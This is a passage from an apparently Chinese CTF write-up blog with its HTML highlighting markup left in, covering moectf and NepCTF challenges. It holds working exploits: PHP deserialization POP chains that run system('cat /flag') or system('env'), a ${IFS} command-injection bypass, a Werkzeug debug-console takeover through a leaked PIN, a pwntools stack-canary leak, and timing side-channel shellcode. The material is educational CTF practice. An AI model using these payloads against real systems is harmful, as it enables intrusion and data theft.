class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$class000</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class001</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class002</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class003</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class000</span><span class="token operator">-></span><span class="token property">what</span> <span class="token operator">=</span> <span class="token variable">$class001</span><span class="token punctuation">;</span><span class="token variable">$class002</span><span class="token operator">-></span><span class="token property">sec</span> <span class="token operator">=</span> <span class="token variable">$class003</span><span class="token punctuation">;</span><span class="token variable">$class001</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dangerous'</span><span class="token punctuation">;</span><span class="token variable">$class001</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$class002</span><span class="token punctuation">;</span><span class="token variable">$class000</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$class003</span><span class="token operator">-></span><span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('env');"</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span>  <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$class000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="headerlink" title="垫刀之路07: 泄漏的密码"></a>垫刀之路07: 泄漏的密码</h3><p>直接给了<code>PIN</code>码，访问<code>/console</code>输入<code>PIN</code>码然后执行<code>python</code>代码读取<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'__pycache__\napp.py\nflag\ngetPIN.py\nstatic\ntemplates\n'</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'moectf&#123;dOnt_USIng_f14SK-By-D36uG-M0D_@Nd_I3AK-YOur-pIN15&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-23"><a href="#8-23" class="headerlink" title="#8.23"></a>#8.23</h2><h3 id="Catch-the-canary"><a href="#Catch-the-canary" class="headerlink" title="Catch_the_canary!"></a>Catch_the_canary!</h3><p>破随机数，泄露<code>canary</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.56.1'</span><span class="token punctuation">,</span> <span class="token number">52282</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16768186</span><span class="token punctuation">,</span> <span class="token number">16770000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'['</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    li<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token operator">==</span> <span class="token string">b'E'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'+'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'+'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xBACD003</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x19</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'it'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x19</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4012C9</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p>绕过空格：<code>cmd=cat$&#123;IFS&#125;/flag</code></p><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$Sink</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Shark</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sink</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token variable">$Sea</span><span class="token punctuation">;</span><span class="token variable">$Sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token variable">$Shark</span><span class="token punctuation">;</span><span class="token variable">$Shark</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$Sink</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Nature</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发过去的序列化内容要在私有类的类名和属性名前加<code>\x00</code>，最终发送<code>nature=O:6:&quot;Nature&quot;:1:&#123;s:3:&quot;sea&quot;;O:3:&quot;Sea&quot;:1:&#123;s:6:&quot;animal&quot;;O:5:&quot;Shark&quot;:1:&#123;s:11:&quot;%00Shark%00word&quot;;O:4:&quot;Sink&quot;:1:&#123;s:9:&quot;%00Sink%00cmd&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;&#125;</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code> 使用: 私有的类的名称 (考虑到继承的情况) 和字段名组合 <code>\x00类名称\x00字段名</code></li><li><code>protected</code> 使用: <code>*</code> 和字段名组合 <code>\x00*\x00字段名</code></li></ul><h2 id="8-24-8-29"><a href="#8-24-8-29" class="headerlink" title="#8.24-8.29"></a>#8.24-8.29</h2><p>打了<code>NepCTF</code>和羊城杯，通宵两晚，打完开始摆烂</p><h3 id="nepbox"><a href="#nepbox" class="headerlink" title="nepbox"></a>nepbox</h3><p>现学了一下侧信道时间盲注爆破<code>flag</code>，回头单独写一篇博客记录一下，这里放个<code>exp</code>，本题就是输入<code>shellcode</code>并且在子进程执行，执行前会进行检查禁用一些系统调用，比如<code>execve</code>，并且把<code>write</code>的参数给篡改了，直接时间盲注爆破，不过很痛苦的是，靶机越打越慢最后直接打亖了…重启很多次靶机才凑出<code>flag</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> syscall_id <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>LABEL_47<span class="token operator">:</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bad System Call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">sub_1467</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        v8 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> dword_4010<span class="token punctuation">;</span>        v24 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>off_4020<span class="token punctuation">)</span><span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">;</span>        v23 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>off_4020<span class="token punctuation">)</span><span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SETREGS<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> v21<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timecontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>charset <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>flag <span class="token operator">=</span> <span class="token string">'NepCTF&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> charset<span class="token punctuation">:</span>        <span class="token keyword">global</span> r        <span class="token comment">#r = process('./pwn')</span>        sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'neptune-33443.nepctf.lemonprefect.cn'</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> typ<span class="token operator">=</span><span class="token string">"tcp"</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''            mov al, byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]            cmp al, </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span 